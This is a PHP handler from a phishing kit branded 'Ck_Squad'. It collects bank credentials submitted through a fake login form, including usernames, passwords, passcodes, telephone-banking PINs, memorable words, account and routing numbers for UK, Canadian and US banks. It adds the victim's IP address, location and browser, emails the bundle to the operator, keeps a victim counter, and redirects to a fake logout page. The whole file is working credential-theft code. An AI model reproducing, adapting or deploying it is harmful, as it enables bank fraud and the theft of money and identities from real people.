<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');

$datei = fopen("../ck_squad_logs/bank.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../ck_squad_logs/bank.txt","w");
fwrite($datei, $count);
fclose($datei);

$message ="
[$$$-------------- Ck_Squad Bank Info UK --------------$$$]
Bank Name       : ".$_POST['bnkname']."".$_POST['bnknames']."
Customer ID     : ".$_POST['csid']."
User ID         : ".$_POST['u_id']."
Surname         : ".$_POST['s_name']."
Username        : ".$_POST['us_name']."
Password        : ".$_POST['pwd_b']."
Passcode        : ".$_POST['pscode']."
Memorable       : ".$_POST['m_able']."
Memorable Place : ".$_POST['m_ableplace']."
Membership Number : ".$_POST['m_num']."
Registration Number   : ".$_POST['rnum']."
Telephone Banking Pin/Security Number   : ".$_POST['tpin']."


[$$$-------------- Ck_Squad Bank Info CA --------------$$$]
Bank Name              : ".$_POST['bnknameca']."
Account Number         : ".$_POST['acnn']."
Login ID/ Card Number  : ".$_POST['lo_ca']."
Password               : ".$_POST['pwd_ca']."


[$$$---------- Ck_Squad Bank Info US & Other ----------$$$]
Bank Name        : ".$_POST['bnknameus']."
Account Number   : ".$_POST['acnot']."
Login Bank       : ".$_POST['lobank']."
Password         : ".$_POST['pwd_csdad']."
Routing/swift    : ".$_POST['swsd']."


[$$$-------------- Ck_Squad Victim Info ---------------$$$]
IP Info         :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

[$$$------------- END Ck_Squad Bank Info --------------$$$]
";
crypto($message);
include('../ck_squad_settings.php');
$subject = "BANK ".$_POST['bnkname']."".$_POST['bnknames']."".$_POST['bnknameca']."".$_POST['bnknameus']." [ ".$nama_negara." - " . $kota . " - " . $ip . " ]";
$headers = "From: Bank Account <bank@cksquad.business>";
mail($ck_squad_email, $subject, $message, $headers);

header("LOCATION: redirscr.php?cmd=_logout&session=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>